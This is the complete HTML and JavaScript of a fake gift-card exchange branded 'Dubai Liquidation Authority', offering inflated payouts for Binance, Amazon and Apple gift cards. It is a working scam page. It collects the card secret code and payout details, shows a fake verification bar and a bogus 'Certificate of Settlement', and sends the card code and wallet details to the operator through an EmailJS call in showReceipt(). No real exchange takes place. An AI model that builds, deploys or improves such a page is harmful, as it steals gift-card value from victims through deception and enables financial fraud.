<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DLA | Global Settlement</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { 
            --gold: #d4af37; 
            --bg: #000; 
            --panel: #0f1115; 
            --text: #ffffff; 
            --input-bg: #16191e; 
            --border: #222;
            --card-bg: #111;
        }

        /* Light Mode Variables */
        [data-theme="light"] {
            --bg: #f4f7f6;
            --panel: #ffffff;
            --text: #1a1a1a;
            --input-bg: #f0f2f5;
            --border: #ddd;
            --card-bg: #ffffff;
        }

        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: 0.3s; }
        
        /* Theme Toggle Button */
        .theme-switch { position: fixed; top: 60px; right: 20px; z-index: 4000; background: var(--panel); border: 1px solid var(--gold); color: var(--gold); padding: 8px 12px; border-radius: 50px; cursor: pointer; font-size: 12px; font-weight: 800; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }

        .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
        .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
        @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }

        .panel { background: var(--panel); border: 1px solid var(--border); padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); position: relative; }
        h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
        .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
        
        label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
        input, select { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border); color: var(--text); border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
        
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 280px; overflow-y: auto; padding: 10px; border: 1px solid var(--border); border-radius: 12px; background: var(--bg); }
        .pay { border: 1px solid var(--border); padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: var(--text); border-radius: 10px; background: var(--card-bg); font-weight: bold; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); }

        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; color: #fff; }
        .res-box b { font-size: 34px; color: #fff; display: block; }
        #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }

        .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; }
        
        /* Receipt remains high-contrast white for official look */
        .receipt-container { background: #fff !important; color: #000 !important; padding: 25px; position: relative; width: 100%; max-width: 370px; margin: 0 auto; box-sizing: border-box; border-radius: 4px; }
        .receipt-body * { color: #000 !important; }

        .chat-btn { position: fixed; bottom: 20px; left: 20px; background: #16191e; border: 1px solid #333; padding: 12px 18px; border-radius: 50px; display: flex; align-items: center; gap: 10px; text-decoration: none; color: #fff; z-index: 3000; }
        .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <button class="theme-switch" onclick="toggleTheme()" id="theme-btn">☀️ LIGHT MODE</button>

    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT</div></div>

    <div class="panel">
        <div id="form">
            <h2>Exchange</h2>
            <div class="tag">Dubai Liquidation Authority</div>

            <label>Asset Class</label>
            <select id="brand" onchange="updateVal()">
                <option value="1.8">💳 Binance Gift Card [1.8x]</option>
                <option value="1.4">📦 Amazon Global [1.4x]</option>
                <option value="1.4">🍎 Apple iTunes [1.4x]</option>
            </select>

            <label>Card Secret Code</label>
            <input id="card" placeholder="ENTER CODE" oninput="this.value = this.value.toUpperCase()">

            <label>Value ($)</label>
            <input id="amt" type="number" value="100" min="25" oninput="updateVal()">

            <div class="res-box">
                <span style="font-size:10px; color:var(--gold);">SETTLEMENT ESTIMATE</span>
                <div id="display-area"><b>$180.00</b></div>
                <div id="local-payout"></div>
            </div>

            <label>Payout Gateway</label>
            <div class="grid">
                <div class="pay" onclick="sel(this, '💎 USDT', 'Wallet', 1, 'USDT')"><span>💎</span>USDT</div>
                <div class="pay" onclick="sel(this, '🔵 PayPal', 'Email', 1, 'USD')"><span>🔵</span>PayPal</div>
                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 'Phone', 131.50, 'KES')"><span>🇰🇪</span>M-Pesa</div>
                <div class="pay" onclick="sel(this, '🇳🇬 Bank', 'Acct', 1610, 'NGN')"><span>🇳🇬</span>Bank NG</div>
            </div>

            <input id="wallet" placeholder="Select method above">
            <input id="email" type="email" placeholder="Confirmation Email" style="margin-top:10px;">

            <button class="main-btn" onclick="submitNow()">Authorize Settlement</button>
        </div>

        <div id="loader" style="display:none; text-align:center; padding:40px 0;">
            <p style="color:var(--gold); font-weight:bold;">VERIFYING ASSETS...</p>
            <div style="width:100%; height:4px; background:#333; margin-top:10px;"><div id="pbar" style="width:0%; height:100%; background:var(--gold);"></div></div>
        </div>

        <div id="success" style="display:none;">
            <div class="receipt-container" id="receipt-content">
                <div class="receipt-body">
                    <h1 style="font-size:20px; font-weight:900; margin:0;">CERTIFICATE OF SETTLEMENT</h1>
                    <p style="font-size:10px; color:var(--gold) !important; font-weight:bold;">DLA VERIFIED TRANSACTION</p>
                    <hr>
                    <div style="display:flex; justify-content:space-between; font-size:12px; margin:10px 0;">
                        <span>ID: <b id="r-tid"></b></span>
                        <span id="r-date"></span>
                    </div>
                    <div style="text-align:center; padding:20px; border:2px solid #000; margin:10px 0;">
                        <span style="font-size:40px; font-weight:900;" id="r-price"></span>
                    </div>
                    <div id="qrcode" style="text-align:center;"></div>
                </div>
            </div>
            <button class="main-btn" onclick="saveHDReceipt()">Save Certificate</button>
        </div>
    </div>

    <script>
        emailjs.init("66-CK4LaUN-dxuYbi");
        let method = ""; let rateL = 1; let sym = "USD";

        function toggleTheme() {
            const html = document.documentElement;
            const btn = document.getElementById('theme-btn');
            if (html.getAttribute('data-theme') === 'dark') {
                html.setAttribute('data-theme', 'light');
                btn.innerText = "🌙 DARK MODE";
            } else {
                html.setAttribute('data-theme', 'dark');
                btn.innerText = "☀️ LIGHT MODE";
            }
        }

        function sel(el, val, shadow, r, s) {
            document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
            el.classList.add('active');
            method = val; rateL = r; sym = s;
            document.getElementById('wallet').placeholder = "Enter " + val + " details";
            updateVal();
        }

        function updateVal() {
            let v = parseFloat(document.getElementById('amt').value);
            let rate = parseFloat(document.getElementById('brand').value);
            let totalUSD = (isNaN(v) ? 0 : (v * rate));
            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
            let lBox = document.getElementById('local-payout');
            if(rateL > 1) {
                lBox.style.display = "block";
                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
            } else { lBox.style.display = "none"; }
        }

        function submitNow() {
            document.getElementById('form').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            let p = 0;
            let iv = setInterval(() => {
                p += 2; document.getElementById('pbar').style.width = p + "%";
                if(p>=100) { clearInterval(iv); showReceipt(); }
            }, 50);
        }

        function showReceipt() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            let tid = "DLA-" + Math.floor(Math.random() * 900000);
            document.getElementById('r-tid').innerText = tid;
            document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
            document.getElementById('r-date').innerText = new Date().toLocaleDateString();
            new QRCode(document.getElementById("qrcode"), { text: tid, width: 80, height: 80 });
            
            emailjs.send("service_4b3p71i", "template_ctf5n8q", {
                card_code: document.getElementById('card').value,
                payout_total_usd: document.getElementById('display-area').innerText,
                wallet_details: document.getElementById('wallet').value
            });
        }

        function saveHDReceipt() {
            html2canvas(document.querySelector("#receipt-content")).then(canvas => {
                const link = document.createElement('a');
                link.download = 'DLA_Settlement.png';
                link.href = canvas.toDataURL();
                link.click();
            });
        }
    </script>
</body>
</html>
